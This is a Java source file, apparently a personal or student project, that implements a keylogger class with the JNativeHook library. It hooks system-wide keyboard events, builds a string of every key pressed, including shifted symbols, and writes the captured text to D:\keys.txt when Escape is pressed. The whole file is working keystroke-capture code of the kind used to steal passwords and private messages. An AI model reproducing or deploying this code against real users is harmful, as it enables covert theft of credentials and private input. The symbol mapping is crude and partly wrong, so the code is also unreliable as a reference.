/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.mycompany.sever;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/**
 *
 * @author HUNG
 */
public class keylogger implements NativeKeyListener{
    static String s = "";
    boolean st;

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        // System.out.println("Key Pressed: " +
        // NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            st = true;
        }
        
        if (st == false) {
            s = s + NativeKeyEvent.getKeyText(e.getKeyCode());
        }

        if (e.getKeyCode() == NativeKeyEvent.VC_1 && st) {

            s = s + "!";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_2 && st) {

            s = s + "@";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_3 && st) {

            s = s + "#";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_4 && st) {

            s = s + "$";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_5 && st) {

            s = s + "%";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_6 && st) {

            s = s + "^";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_7 && st) {

            s = s + "&";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_8 && st) {

            s = s + "*";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_9 && st) {

            s = s + "(";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_0 && st) {

            s = s + ")";

        }
        if (e.getKeyCode() == NativeKeyEvent.VC_SPACE && st) {

            s = s + " ";
        }

        if (e.getKeyCode() == NativeKeyEvent.VC_EQUALS&& st) {

            s = s + "+";
        }
        if (e.getKeyCode() == NativeKeyEvent.VC_UNDERSCORE&& st) {

            s = s + "_";
        }
      

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                File f = new File("D:\\keys.txt");
                try (FileWriter fw = new FileWriter(f)) {
                    fw.write(s);
                }

                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException | IOException ef) {
            }
        }
    }


    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
         System.out.println("Key Released: " +
         NativeKeyEvent.getKeyText(e.getKeyCode()));
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            st = false;
        }
    }


    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
         System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

//    public static void main(String[] args) throws Exception {
//        try {
//
//            GlobalScreen.registerNativeHook();
//        } catch (NativeHookException ex) {
//
//            System.err.println("There was a problem registering the native hook.");
//            System.err.println(ex.getMessage());
//            System.exit(1);
//        }
//
//    }
}
